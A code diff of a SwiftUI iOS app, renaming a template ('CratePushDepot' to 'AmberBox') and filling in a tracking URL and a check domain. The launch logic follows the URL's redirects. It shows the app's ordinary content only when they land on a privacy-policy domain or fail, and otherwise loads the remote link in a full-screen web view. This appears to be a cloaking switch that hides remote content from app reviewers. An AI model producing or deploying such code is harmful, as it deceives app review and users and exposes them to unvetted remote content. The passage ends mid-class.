@@ -1,69 +1,69 @@
 import SwiftUI
 
 @main
-struct CratePushDepotApp: App {
-    @State private var cratePushDepotLinkReady: Bool? = nil
-    @StateObject private var store = CPDStore()
+struct AmberBoxApp: App {
+    @State private var amberBoxLinkReady: Bool? = nil
+    @StateObject private var store = ABStore()
 
-    private let cratePushDepotSourceLink = "https://example.com"
-    private let cratePushDepotCheckDomain = "example"
+    private let amberBoxSourceLink = "https://muzakoroadstudio.org/click.php"
+    private let amberBoxCheckDomain = "freeprivacypolicy.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = cratePushDepotLinkReady {
+                if let ready = amberBoxLinkReady {
                     if ready {
-                        CratePushDepotWebPanel(cratePushDepotURLString: cratePushDepotSourceLink)
+                        AmberBoxWebPanel(amberBoxURLString: amberBoxSourceLink)
                             .edgesIgnoringSafeArea(.all)
                     } else {
                         ContentView()
                             .environmentObject(store)
                     }
                 } else {
-                    CratePushDepotLoadingScreen()
-                        .onAppear { cratePushDepotCheckLink() }
+                    AmberBoxLoadingScreen()
+                        .onAppear { amberBoxCheckLink() }
                 }
             }
             .preferredColorScheme(.light)
         }
     }
 
-    private func cratePushDepotCheckLink() {
-        guard let url = URL(string: cratePushDepotSourceLink) else {
-            cratePushDepotLinkReady = false
+    private func amberBoxCheckLink() {
+        guard let url = URL(string: amberBoxSourceLink) else {
+            amberBoxLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = CratePushDepotRedirectTracker(checkDomain: cratePushDepotCheckDomain)
+        let tracker = AmberBoxRedirectTracker(checkDomain: amberBoxCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    cratePushDepotLinkReady = false; return
+                    amberBoxLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(cratePushDepotCheckDomain) {
-                    cratePushDepotLinkReady = false; return
+                   finalURL.contains(amberBoxCheckDomain) {
+                    amberBoxLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(cratePushDepotCheckDomain) {
-                    cratePushDepotLinkReady = false; return
+                   respURL.contains(amberBoxCheckDomain) {
+                    amberBoxLinkReady = false; return
                 }
                 if error != nil {
-                    cratePushDepotLinkReady = false; return
+                    amberBoxLinkReady = false; return
                 }
-                cratePushDepotLinkReady = true
+                amberBoxLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if cratePushDepotLinkReady == nil { cratePushDepotLinkReady = false }
+            if amberBoxLinkReady == nil { amberBoxLinkReady = false }
         }
     }
 }
 
-final class CratePushDepotRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class AmberBoxRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
